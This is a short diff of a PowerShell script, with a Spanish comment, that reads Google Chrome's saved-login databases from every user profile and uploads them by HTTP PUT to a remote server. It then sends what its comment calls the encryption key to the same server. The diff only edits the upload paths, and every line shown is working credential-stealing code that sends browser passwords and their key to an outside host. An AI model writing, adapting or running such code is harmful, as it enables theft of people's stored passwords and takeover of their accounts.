@@ -38,16 +38,16 @@ if ($profiles) {
     foreach ($profile in $profiles) {
         $file_name = $profile.Name -replace " ", ""
         $file_logins = "$env:LOCALAPPDATA\Google\Chrome\User Data\$($profile.Name)\login data"
-        Invoke-WebRequest -Uri "$server/upload_file/login_data_$env:USERNAME_$file_name" -Method PUT -InFile $file_logins -ContentType "application/octet-stream"
+        Invoke-WebRequest -Uri $server/login_data_$env:USERNAME_$file_name -Method PUT -InFile $file_logins -ContentType "application/octet-stream"
     }
 }
 else {
     $file_logins = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\login data"
-    Invoke-WebRequest -Uri "$server/upload_file/login_data_$env:USERNAME_default" -Method PUT -InFile $file_logins -ContentType "application/octet-stream"
+    Invoke-WebRequest -Uri $server/login_data_$env:USERNAME -Method PUT -InFile $file_logins -ContentType "application/octet-stream"
 }
 
 # Envio de clave de cifrado
-Invoke-RestMethod -Uri "$server/receive_text" -Method PUT -Body (Get-Content $cont -Raw) -ContentType "text/plain"
+Invoke-RestMethod -Uri $server/password_$env:USERNAME -Method PUT -Body (Get-Content $cont -Raw) -ContentType "text/plain"
 
 
 
